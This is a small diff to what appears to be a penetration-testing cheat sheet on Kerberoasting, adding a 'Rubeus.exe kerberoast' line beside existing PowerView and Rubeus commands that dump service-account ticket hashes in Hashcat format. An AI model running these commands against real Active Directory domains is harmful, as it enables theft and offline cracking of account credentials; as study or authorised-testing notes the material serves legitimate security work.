@@ -157,6 +157,9 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfre
 # Using the /stats Flag (get SPNs count , encryption types and latest change date)
 .\Rubeus.exe kerberoast /stats
 
+# get all spns and hashes
+Rubeus.exe kerberoast
+
 # get ticket (we can see the supported Encryption type also)
 .\Rubeus.exe kerberoast /user:testspn /nowrap
 
